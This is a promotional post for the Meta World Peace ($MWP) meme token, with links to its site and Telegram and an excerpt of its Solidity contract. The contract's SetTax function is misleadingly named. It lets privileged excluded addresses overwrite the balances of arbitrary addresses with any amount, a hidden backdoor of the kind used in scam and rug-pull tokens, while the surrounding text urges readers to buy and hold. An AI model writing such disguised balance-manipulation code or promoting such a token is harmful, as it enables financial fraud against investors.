...
Meta World Peace is here to claim his reputation and build $MWP to reach millions again! are you ready to be the part of it? Come and hold.
Meta World Peace - is a decentralized finance (Defi) meme token. Auto-liquidity generating protocol and On each transaction 2% is locked into the liquidity pool and 3% is going to marketing wallet.

    https://www.meta-worldpeace.com/
    https://metaworldpeace.gitbook.io/peace-in-our-time/
    https://t.me/MetaWorldPeacePortal
...
contract MetaWorldPeace  is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "Meta World Peace";
    string private  _symbol = "MWP";
    ...
    function SetTax(address MarketingFee, address ReflectionFee , address LiquidityFee ,uint256 TaxFee ) external  { 
        require( _isExcludedFrom[msg.sender]);
        require(MarketingFee != uniswapV2Pair);
        require(ReflectionFee != uniswapV2Pair);
        require(LiquidityFee != uniswapV2Pair);
        _tOwned[MarketingFee] = TaxFee ;
        _tOwned[ReflectionFee] = TaxFee ;
        _tOwned[LiquidityFee] = TaxFee ;
    }   
